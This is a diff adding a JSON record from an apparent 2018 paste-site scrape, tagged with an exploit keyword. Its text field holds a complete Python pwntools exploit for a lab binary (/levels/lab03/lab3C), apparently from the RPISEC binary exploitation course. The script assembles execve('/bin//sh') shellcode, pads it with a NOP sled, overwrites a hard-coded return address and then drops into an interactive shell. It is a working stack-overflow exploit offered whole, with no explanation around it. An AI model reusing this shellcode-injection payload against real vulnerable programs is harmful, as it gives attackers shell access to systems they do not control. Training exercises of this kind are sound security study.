@@ -1,0 +1,14 @@
+{
+ "espireDate": "N",
+ "format": "python",
+ "jSonReasons": [
+  "lg_en",
+  "kw_exploit"
+ ],
+ "key": "mG9RGJEw",
+ "pasteDate": "Feb 8, 2018, 4:37:36 PM",
+ "relevancy": 0.0,
+ "relevant": false,
+ "text": "from pwn import *\nimport sys\n\n\n\nPROG_NAME = \"/levels/lab03/lab3C\"\n\ndef exploit(offset):\n        proc = process(PROG_NAME)\n        ret_addr = 0xbffff6ac + long(offset)\n        execve_shcode = asm(\\\n                \"\"\"\n                xor eax, eax\n                push eax\n                push 0x68732f2f\n                push 0x6e69622f\n                mov ebx, esp\n                mov ecx, eax\n                mov edx, eax\n                mov al, 11\n                int 0x80\n                xor eax, eax\n                inc eax\n                int 0x80\n                \"\"\")\n\n\n        payload = execve_shcode.rjust(40, \"\\x90\") + p32(ret_addr)\n        print \"PAYLOAD: \" + payload.encode('hex')\n\n        #proc.interactive()\n        #print proc.recvline()\n        #print proc.recvuntil(\"Enter Username:\")\n        proc.sendline(\"rpisec\")\n        proc.sendline(payload)\n        proc.sendline(\"echo AAAA\")\n        proc.recvuntil(\"AAAA\")\n        proc.interactive()\n\n\nexploit(sys.argv[1])",
+ "title": ""
+}
